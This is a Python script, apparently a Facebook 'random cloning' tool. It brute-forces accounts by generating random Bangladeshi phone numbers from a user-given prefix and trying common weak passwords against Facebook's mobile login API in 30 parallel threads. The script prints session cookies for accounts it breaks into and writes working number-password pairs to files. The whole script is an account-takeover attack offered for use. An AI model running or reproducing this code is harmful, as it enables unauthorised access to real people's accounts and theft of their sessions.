#follow my facebook page https://www.facebook.com/jubairbroFF
#follow github https://github.com/jubairbro
#join our fb grup https://www.facebook.com/groups/jubairbrofreenet/
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
#-------------color----------------#
bb="\033[1;34m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"       
bblue="\033[1;30m"         
P="\033[1;35m"        
C="\033[1;36m"          
B="\033[1;37m"       
my_color = [
 B,C,P,H,M]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#-------------logo-----------------#
logo=(f'''{B}
{warna}──╔╦╗─╔╦══╗╔═══╦══╦═══╗
──║║║─║║╔╗║║╔═╗╠╣╠╣╔═╗║
──║║║─║║╚╝╚╣║─║║║║║╚═╝║
╔╗║║║─║║╔═╗║╚═╝║║║║╔╗╔╝
║╚╝║╚═╝║╚═╝║╔═╗╠╣╠╣║║╚╗
╚══╩═══╩═══╩╝─╚╩══╩╝╚═╝
{warna}--------------------------------------------{B}
 Owner     : {C}Jubair Ahmad{B}
 Guthub    : {C}Jubairbro{B}
 Facebook  : {C}Jubair bro{B}
 Taligram  : {bb}https://t.me/jubairff{P}
 Tools     : {P}New •{warna}[{H}version 5.1{warna}]{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def JUBAIR_BRO():
	#os.system('pip uninstall requests -y && pip install requests')
	#os.system('clear')
	#os.system('xdg-open https://www.facebook.com/groups/jubairbrofreenet/')
	clear()
	print(f'{B} [{warna}01{B}] RANDOM CLONING ')
	print(f'{B} [{warna}00{B}] EXIT TERMINAL ')
	linex()
	option=input(f' {B}[{warna}??{B}] CHOICE MENU >> ')
	if option in ['01','1']:
		BD_CLONING()
	else:
		exit(' Thanks for using my tool 😘')
def BD_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
    code=input(' ENTER SIM CODE >> ')
    linex()
    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
    try:
        limit=int(input(' ENTER LIMIT >> '))
    except ValueError:
        limit=99999
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as Dipto:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'sadiya','jannat','freefire','fflover','@freefire','FreeFire','102030','@102030','@203040','@999000']
            Dipto.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
            header={'user-agent': '[FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
            url='https://b-api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                if str(uid) in oks:
                    break
                else:
                    print('\r\r \033[1;32m[ID-OK🌺] '+(id)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/ID-OK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;30m[ID-CP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/ID-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#-------------end----------------#
JUBAIR_BRO()
import py_compile
#follow my facebook page https://www.facebook.com/jubairbroFF
#follow github https://github.com/jubairbro
#join our fb grup https://www.facebook.com/groups/jubairbrofreenet/